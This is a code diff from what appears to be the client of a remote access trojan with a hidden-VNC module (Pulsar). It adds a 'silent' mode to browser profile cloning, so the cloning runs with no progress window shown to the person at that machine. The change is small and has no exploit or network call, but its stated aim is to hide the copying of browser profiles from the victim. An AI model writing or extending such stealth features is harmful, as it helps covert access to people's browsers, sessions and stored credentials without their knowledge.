@@ -70,9 +70,23 @@ namespace Pulsar.Client.Helper.HVNC
             return completionSource.Task;
         }
 
-        public static Task<BrowserCloneProgressSession> TryCreateAsync(string browserName)
+        /// <summary>
+        /// Creates a progress session for browser profile cloning.
+        /// </summary>
+        /// <param name="browserName">Name of the browser being cloned</param>
+        /// <param name="silent">If true, no UI is shown (cloning happens silently)</param>
+        /// <returns>Progress session, or null if silent mode or creation failed</returns>
+        public static Task<BrowserCloneProgressSession> TryCreateAsync(string browserName, bool silent = false)
         {
             var completion = new TaskCompletionSource<BrowserCloneProgressSession>(TaskCreationOptions.RunContinuationsAsynchronously);
+
+            // In silent mode, return null immediately (cloning happens without UI)
+            if (silent)
+            {
+                Debug.WriteLine($"[BrowserCloneProgressSession] Silent mode enabled for {browserName} - no UI will be shown");
+                completion.TrySetResult(null);
+                return completion.Task;
+            }
 
             var uiThread = new Thread(() =>
             {
